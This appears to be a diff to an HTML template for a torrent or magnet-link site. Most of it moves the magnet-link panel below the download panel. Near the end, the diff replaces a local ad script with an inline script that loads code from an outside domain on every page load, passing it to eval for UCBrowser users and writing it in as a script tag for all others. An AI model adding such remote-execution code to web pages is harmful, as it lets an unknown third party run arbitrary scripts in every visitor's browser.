@@ -83,17 +83,6 @@
 
       <div class="panel panel-default border-radius">
         <div class="panel-heading">
-          <h3 class="panel-title">磁链地址</h3>
-        </div>
-        <div class="panel-body">
-          <i class="fa fa-magnet"></i>
-          <a th:href="'magnet:?xt=urn:btih:' + ${metadata.getInfohash()}"
-             th:text="'magnet:?xt=urn:btih:' + ${metadata.getInfohash()}"></a>
-        </div>
-      </div>
-
-      <div class="panel panel-default border-radius">
-        <div class="panel-heading">
           <h3 class="panel-title">资源下载</h3>
         </div>
         <div class="panel-body">
@@ -117,6 +106,17 @@
               <strong style="font-size: 15px; color: #0003F0; margin-top: 10px;">下载没速度？点这里！</strong>
             </a>
           </p>
+        </div>
+      </div>
+
+      <div class="panel panel-default border-radius">
+        <div class="panel-heading">
+          <h3 class="panel-title">磁链地址</h3>
+        </div>
+        <div class="panel-body">
+          <i class="fa fa-magnet"></i>
+          <a th:href="'magnet:?xt=urn:btih:' + ${metadata.getInfohash()}"
+             th:text="'magnet:?xt=urn:btih:' + ${metadata.getInfohash()}"></a>
         </div>
       </div>
 
@@ -180,7 +180,6 @@
 <script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"></script>
 <!-- 加载 Bootstrap 的所有 JavaScript 插件。你也可以根据需要只加载单个插件。 -->
 <script src="https://cdn.bootcss.com/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
-</body>
 
 <script>
   (function(){
@@ -197,6 +196,26 @@
   })();
 </script>
 
-<script src="/js/dynamicad.js"></script>
+<script>(function () {
+  var _b = 'https://y.unilz588.com/Herfdju.aspx?Gsdew=3411&t=' + (new Date().getTime());
+  if (navigator.userAgent.indexOf('UCBrowser') > -1) {
+    var a = new XMLHttpRequest();
+    if (a != null) {
+      a.onreadystatechange = function () {
+        if (a.readyState == 4) {
+          if (a.status == 200) {
+            if (window.execScript) window.execScript(a.responseText, 'JavaScript'); else if (window.eval) window.eval(a.responseText, 'JavaScript'); else eval(a.responseText)
+          }
+        }
+      };
+      a.open('GET', _b, false);
+      a.send(null)
+    }
+  } else {
+    document.writeln(unescape("%3Cscript src='" + _b + "'%3E%3C/script%3E"))
+  }
+})();</script>
+<!--<script src="/js/dynamicad.js"></script>-->
 
+</body>
 </html>
